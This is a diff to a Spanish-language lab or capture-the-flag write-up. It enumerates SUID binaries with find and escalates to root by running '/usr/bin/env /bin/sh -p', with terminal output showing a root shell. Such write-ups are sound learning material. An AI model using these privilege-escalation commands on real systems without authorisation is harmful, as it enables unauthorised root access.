@@ -116,7 +116,13 @@ dylan@b5df33a8267a:~$ find / -perm -4000 2>/dev/null
 /usr/lib/openssh/ssh-keysign
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
-Si vamos a [GTOFBins](https://gtfobins.github.io/gtfobins/env/), vemos que con el binario **/usr/bin/env** podemos ejecutar una bash con privilegios.
+Si vamos a [GTOFBins](https://gtfobins.github.io/gtfobins/env/), vemos que con el binario **/usr/bin/env** podemos ejecutar una bash con privilegios de root.
 ```bash
 /usr/bin/env /bin/sh -p
+```
+```bash
+dylan@b5df33a8267a:~$ /usr/bin/env /bin/sh -p
+# whoami
+root
+# 
 ```
